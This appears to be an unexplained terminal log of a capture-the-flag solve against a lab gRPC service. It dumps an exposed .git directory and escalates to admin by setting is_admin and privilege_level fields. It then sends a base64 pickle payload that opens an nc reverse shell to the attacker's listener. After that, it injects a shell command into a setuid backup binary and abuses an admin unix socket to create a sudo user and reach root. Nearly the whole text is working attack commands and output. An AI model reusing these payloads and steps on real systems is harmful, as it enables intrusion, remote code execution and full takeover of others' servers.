@@ -1,0 +1,387 @@
+abura@Winbu MINGW64 /c/Main/Projects/Temp
+$ git-dumper http://192.168.56.11/.git ./cpr-dumped
+[-] Testing http://192.168.56.11/.git/HEAD [200]
+[-] Testing http://192.168.56.11/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://192.168.56.11/.gitignore [200]
+[-] Fetching http://192.168.56.11/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://192.168.56.11/.git/description [200]
+[-] Fetching http://192.168.56.11/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/post-commit.sample [404]
+[-] Fetching http://192.168.56.11/.git/hooks/commit-msg.sample [200]
+[-] http://192.168.56.11/.git/hooks/post-commit.sample responded with status code 404
+[-] Fetching http://192.168.56.11/.git/hooks/post-receive.sample [404]
+[-] http://192.168.56.11/.git/hooks/post-receive.sample responded with status code 404
+[-] Fetching http://192.168.56.11/.git/hooks/post-update.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/pre-push.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://192.168.56.11/.git/hooks/update.sample [200]
+[-] Fetching http://192.168.56.11/.git/info/exclude [200]
+[-] Fetching http://192.168.56.11/.git/objects/info/packs [404]
+[-] http://192.168.56.11/.git/objects/info/packs responded with status code 404
+[-] Fetching http://192.168.56.11/.git/index [200]
+[-] Finding refs/
+[-] Fetching http://192.168.56.11/.git/FETCH_HEAD [404]
+[-] http://192.168.56.11/.git/FETCH_HEAD responded with status code 404
+[-] Fetching http://192.168.56.11/.git/ORIG_HEAD [404]
+[-] http://192.168.56.11/.git/ORIG_HEAD responded with status code 404
+[-] Fetching http://192.168.56.11/.git/HEAD [200]
+[-] Fetching http://192.168.56.11/.git/config [200]
+[-] Fetching http://192.168.56.11/.git/info/refs [404]
+[-] Fetching http://192.168.56.11/.git/logs/HEAD [200]
+[-] http://192.168.56.11/.git/info/refs responded with status code 404
+[-] Fetching http://192.168.56.11/.git/logs/refs/heads/master [200]
+[-] Fetching http://192.168.56.11/.git/logs/refs/heads/production [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/heads/development [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/heads/staging [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/heads/main [404]
+[-] http://192.168.56.11/.git/logs/refs/heads/production responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/heads/development responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/heads/staging responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/heads/main responded with status code 404
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/HEAD [404]
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/HEAD responded with status code 404
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/master [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/production [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/development [404]
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/main [404]
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/master responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/production responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/development responded with status code 404
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/main responded with status code 404
+[-] Fetching http://192.168.56.11/.git/logs/refs/remotes/origin/staging [404]
+[-] http://192.168.56.11/.git/logs/refs/remotes/origin/staging responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/heads/main [404]
+[-] http://192.168.56.11/.git/refs/heads/main responded with status code 404
+[-] Fetching http://192.168.56.11/.git/logs/refs/stash [404]
+[-] http://192.168.56.11/.git/logs/refs/stash responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/heads/production [404]
+[-] http://192.168.56.11/.git/refs/heads/production responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/heads/master [200]
+[-] Fetching http://192.168.56.11/.git/packed-refs [404]
+[-] http://192.168.56.11/.git/packed-refs responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/heads/staging [404]
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/main [404]
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/production [404]
+[-] http://192.168.56.11/.git/refs/remotes/origin/production responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/HEAD [404]
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/master [404]
+[-] http://192.168.56.11/.git/refs/heads/staging responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/staging [404]
+[-] http://192.168.56.11/.git/refs/remotes/origin/main responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/heads/development [404]
+[-] http://192.168.56.11/.git/refs/remotes/origin/HEAD responded with status code 404
+[-] http://192.168.56.11/.git/refs/remotes/origin/master responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/remotes/origin/development [404]
+[-] http://192.168.56.11/.git/refs/remotes/origin/staging responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/stash [404]
+[-] http://192.168.56.11/.git/refs/heads/development responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/wtree/refs/heads/main [404]
+[-] http://192.168.56.11/.git/refs/remotes/origin/development responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/wtree/refs/heads/staging [404]
+[-] http://192.168.56.11/.git/refs/stash responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/wtree/refs/heads/master [404]
+[-] http://192.168.56.11/.git/refs/wip/wtree/refs/heads/master responded with status code 404
+[-] http://192.168.56.11/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/wtree/refs/heads/production [404]
+[-] http://192.168.56.11/.git/refs/wip/wtree/refs/heads/main responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/wtree/refs/heads/development [404]
+[-] http://192.168.56.11/.git/refs/wip/wtree/refs/heads/production responded with status code 404
+[-] http://192.168.56.11/.git/refs/wip/wtree/refs/heads/development responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/index/refs/heads/main [404]
+[-] Fetching http://192.168.56.11/.git/refs/wip/index/refs/heads/staging [404]
+[-] Fetching http://192.168.56.11/.git/refs/wip/index/refs/heads/development [404]
+[-] http://192.168.56.11/.git/refs/wip/index/refs/heads/main responded with status code 404
+[-] http://192.168.56.11/.git/refs/wip/index/refs/heads/staging responded with status code 404
+[-] http://192.168.56.11/.git/refs/wip/index/refs/heads/development responded with status code 404
+[-] Fetching http://192.168.56.11/.git/refs/wip/index/refs/heads/production [404]
+[-] Fetching http://192.168.56.11/.git/refs/wip/index/refs/heads/master [404]
+[-] http://192.168.56.11/.git/refs/wip/index/refs/heads/production responded with status code 404
+[-] http://192.168.56.11/.git/refs/wip/index/refs/heads/master responded with status code 404
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching http://192.168.56.11/.git/objects/38/c8c83f6c6b554ddc6c1aea6a4a81512f1f4ad0 [200]
+[-] Fetching http://192.168.56.11/.git/objects/b1/c1569c86794756222fd719e39cf5c658e57a6c [200]
+[-] Fetching http://192.168.56.11/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] http://192.168.56.11/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
+[-] Fetching http://192.168.56.11/.git/objects/a4/68bbfa6e1d2689502cfe7893026431d23a71a4 [200]
+[-] Fetching http://192.168.56.11/.git/objects/33/7c0e5d7ab361a6fde6f8e3a15b32b91c637ec8 [200]
+[-] Fetching http://192.168.56.11/.git/objects/76/5bb58220e6ad1b9513d553b66501524a48aab8 [200]
+[-] Fetching http://192.168.56.11/.git/objects/fa/710f493cae1acd56eebaf5aa09562d56391f12 [200]
+[-] Fetching http://192.168.56.11/.git/objects/6c/0480ba6fe7fa77ed9c20f0315edff62e9e1d6d [200]
+[-] Fetching http://192.168.56.11/.git/objects/18/2ee9488b30e5502f5b862c4d23cf92840aa39b [200]
+[-] Fetching http://192.168.56.11/.git/objects/cd/70d72a0872eeba3aad914f30589fdf763ee9b3 [200]
+[-] Fetching http://192.168.56.11/.git/objects/0e/5dafeea9726ab2dc28c3d6d7ac073f8c34f79d [200]
+[-] Running git checkout .
+
+abura@Winbu MINGW64 /c/Main/Projects/Temp
+$ ls cpr-dumped/
+README.md  proto/
+
+abura@Winbu MINGW64 /c/Main/Projects/Temp
+$ ls cpr-dumped/proto/
+auth.proto  backup.proto  internal.proto  monitoring.proto  user.proto
+
+--
+
+
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext 192.168.56.11:50051 list cpr.auth.AuthService
+grpcurl -plaintext 192.168.56.11:50051 list cpr.user.UserService
+cpr.auth.AuthService.LoginUser
+cpr.auth.AuthService.RegisterUser
+cpr.user.UserService.GetUserDetails
+cpr.user.UserService.ListUsers
+cpr.user.UserService.UpdateProfile
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext 192.168.56.11:50051 describe cpr.user.UpdateProfileRequest
+cpr.user.UpdateProfileRequest is a message:
+message UpdateProfileRequest {
+  string user_id = 1;
+  string name = 2;
+  string email = 3;
+  string bio = 4;
+  bool is_admin = 5;
+  int32 privilege_level = 6;
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "username": "hacker",
+  "email": "hacker@test.com",
+  "password": "Password123!"
+}' 192.168.56.11:50051 cpr.auth.AuthService/RegisterUser
+{
+  "success": true,
+  "message": "User registered successfully",
+  "user_id": "usr_e162ae0526f8"
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "user_id": "usr_e162ae0526f8"
+}' 192.168.56.11:50051 cpr.user.UserService/GetUserDetails
+{
+  "success": true,
+  "user_id": "usr_e162ae0526f8",
+  "username": "hacker",
+  "email": "hacker@test.com",
+  "role": "user"
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "user_id": "usr_e162ae0526f8",
+  "email": "hacker@test.com",
+  "bio": "CTF Player",
+  "is_admin": true,
+  "privilege_level": 100
+}' 192.168.56.11:50051 cpr.user.UserService/UpdateProfile
+{
+  "success": true,
+  "message": "Profile updated successfully"
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "user_id": "usr_e162ae0526f8"
+}' 192.168.56.11:50051 cpr.user.UserService/GetUserDetails
+{
+  "success": true,
+  "user_id": "usr_e162ae0526f8",
+  "username": "hacker",
+  "email": "hacker@test.com",
+  "bio": "CTF Player",
+  "role": "admin",
+  "privilege_level": 100,
+  "flag": "H7CTF{d1d_y0u_l3arn_ab0ut_pr0t0buf_inject10ns}"
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "user_id": "usr_e162ae0526f8"
+}' 192.168.56.11:50051 cpr.backup.BackupService/ListBackups
+{
+  "success": true,
+  "backups": [
+    {
+      "backup_id": "backup_001",
+      "backup_name": "system_backup_2025_10_01",
+      "created_at": "2025-10-01 10:00:00",
+      "size": "1024000"
+    },
+    {
+      "backup_id": "backup_002",
+      "backup_name": "user_data_2025_10_15",
+      "created_at": "2025-10-15 14:30:00",
+      "size": "2048000"
+    }
+  ]
+}
+
+abura@Winbu MINGW64 ~
+$ grpcurl -plaintext -d '{
+  "user_id": "usr_e162ae0526f8",
+  "backup_name": "evil",
+  "backup_data": "gASVZwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjExybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfGJhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjU2LjEgNDQ0NCA+L3RtcC9mlIWUUpQu"
+}' 192.168.56.11:50051 cpr.backup.BackupService/RestoreBackup
+
+PS C:\Users\abura> ncat.exe -lvnp 4444
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.56.11:56488.
+bash: cannot set terminal process group (7849): Inappropriate ioctl for device
+bash: no job control in this shell
+svc-runtime@cpr-gateway:/opt/cpr/app$ whoami
+whoami
+svc-runtime
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ id
+id
+uid=2001(svc-runtime) gid=999(svc-runtime) groups=999(svc-runtime)
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ cat /home/svc-runtime/flag.txt
+cat /home/svc-runtime/flag.txt
+H7CTF{need_oorugai_f0r_curd_r1c3}
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/snap/core20/2599/usr/bin/chfn
+/snap/core20/2599/usr/bin/chsh
+/snap/core20/2599/usr/bin/gpasswd
+/snap/core20/2599/usr/bin/mount
+/snap/core20/2599/usr/bin/newgrp
+/snap/core20/2599/usr/bin/passwd
+/snap/core20/2599/usr/bin/su
+/snap/core20/2599/usr/bin/sudo
+/snap/core20/2599/usr/bin/umount
+/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2599/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/fusermount3
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/local/bin/cpr-backup
+ls -la /usr/local/bin/cpr-backupsvc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cprls -la /usr/local/bin/cpr-backup
+<ocal/bin/cpr-backupls -la /usr/local/bin/cpr-backup
+ls: cannot access '/usr/local/bin/cpr-backupls': No such file or directory
+-rwsr-sr-x 1 abu platform-admins 14472 Nov  6 03:13 /usr/local/bin/cpr-backup
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ file /usr/local/bin/cpr-backup
+file /usr/local/bin/cpr-backup
+/usr/local/bin/cpr-backup: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=db70842b44f272494d33f3efa46f987e9b74a1a8, for GNU/Linux 3.2.0, stripped
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ ls -la
+ls -la
+total 36
+drwxr-xr-x 4 svc-runtime svc-runtime  4096 Nov  6 03:13 .
+drwxr-xr-x 6 svc-runtime svc-runtime  4096 Nov  6 03:13 ..
+drwxr-xr-x 2 svc-runtime svc-runtime  4096 Nov  6 03:13 __pycache__
+-r--r----- 1 root        svc-runtime  6242 Nov  6 03:13 database.py
+drwxr-xr-x 3 svc-runtime svc-runtime  4096 Nov  6 03:13 proto
+-r-xr-x--- 1 root        svc-runtime 11244 Nov  6 03:13 server.py
+svc-runtime@cpr-gateway:/opt/cpr/app$
+svc-runtime@cpr-gateway:/opt/cpr/app$ cd ..
+cd ..
+svc-runtime@cpr-gateway:/opt/cpr$
+svc-runtime@cpr-gateway:/opt/cpr$ ls -la
+ls -la
+total 24
+drwxr-xr-x 6 svc-runtime svc-runtime     4096 Nov  6 03:13 .
+drwxr-xr-x 3 root        root            4096 Nov  6 03:13 ..
+drwxr-xr-x 4 svc-runtime svc-runtime     4096 Nov  6 03:13 app
+drwxrwxr-x 2 abu         platform-admins 4096 Nov  6 03:13 backups
+drwxr-xr-x 2 svc-runtime svc-runtime     4096 Nov  6 03:58 data
+drwxr-xr-x 2 svc-runtime svc-runtime     4096 Nov  6 03:13 logs
+svc-runtime@cpr-gateway:/opt/cpr$
+svc-runtime@cpr-gateway:/opt/cpr$ /usr/local/bin/cpr-backup "x; /bin/bash #"
+/usr/local/bin/cpr-backup "x; /bin/bash #"
+[*] Creating backup: x; /bin/bash #
+tar: Cowardly refusing to create an empty archive
+Try 'tar --help' or 'tar --usage' for more information.
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ whoami
+whoami
+abu
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ id
+id
+uid=2002(abu) gid=1100(platform-admins) groups=1100(platform-admins),999(svc-runtime)
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ cat /home/abu/flag.txt
+cat /home/abu/flag.txt
+H7CTF{p1vot_1s_4_ch4nge_1n_strategy_w1th0ut_ch4nge_1n_vision}
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ ls -la /var/run/ | grep cpr
+ls -la /var/run/ | grep cpr
+srwxrwx---  1 root platform-admins    0 Nov  6 03:13 cpr-admin.sock
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix /var/run/cpr-admin.sock list
+<pcurl -plaintext -unix /var/run/cpr-admin.sock list
+cpr.internal.AdminService
+grpc.reflection.v1alpha.ServerReflection
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix /var/run/cpr-admin.sock list cpr.internal.AdminService
+<r/run/cpr-admin.sock list cpr.internal.AdminService
+cpr.internal.AdminService.CreateSudoUser
+cpr.internal.AdminService.ExecuteCommand
+cpr.internal.AdminService.GetRootShell
+cpr.internal.AdminService.RestartService
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix -d '{"command":"cat /root/flag.txt"}' /var/run/cpr-admin.sock cpr.internal.AdminService/ExecuteCommand
+<admin.sock cpr.internal.AdminService/ExecuteCommand
+{
+  "success": true,
+  "output": "H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}\n"
+}
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix -d '{"username":"pwned","password":"Pwn3d123","sudo_access":true}' /var/run/cpr-admin.sock cpr.internal.AdminService/CreateSudoUser
+<admin.sock cpr.internal.AdminService/CreateSudoUser
+{
+  "success": true,
+  "message": "User pwned created successfully with sudo privileges"
+}
+abu@cpr-gateway:/opt/cpr/data$
+abu@cpr-gateway:/opt/cpr/data$ su pwned
+su pwned
+Password: Pwn3d123
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+pwned@cpr-gateway:/opt/cpr/data$
+pwned@cpr-gateway:/opt/cpr/data$ sudo su
+sudo su
+
+root@cpr-gateway:/opt/cpr/data#
+root@cpr-gateway:/opt/cpr/data# whoami
+whoami
+root
+root@cpr-gateway:/opt/cpr/data#
+root@cpr-gateway:/opt/cpr/data# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@cpr-gateway:/opt/cpr/data#
